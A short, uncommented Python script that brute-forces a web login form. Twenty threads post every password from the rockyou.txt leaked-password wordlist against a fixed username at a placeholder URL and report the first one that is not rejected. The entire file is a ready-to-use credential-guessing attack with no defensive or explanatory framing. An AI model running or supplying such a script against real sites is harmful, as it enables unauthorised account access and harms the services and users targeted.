import threading
import requests as r
from queue import Queue 



def Brute(q):
	while True:
		
		password = q.get()
		username = 'username'
		postrequest = r.post("http://url",data={'username':username,'password':password})
		if "Incorrect" in postrequest.text:
			print(postrequest.text)
		else:
			print('Correct username and password '+username+' '+password)
			break

q1 = Queue()	
badpass = open('rockyou.txt','r',encoding='ascii',errors='ignore')
for words in badpass.readlines():
	q1.put(words.strip('\n'))


for i in range(20):
	t = threading.Thread(target=Brute,args=(q1,))
	t.start()
	
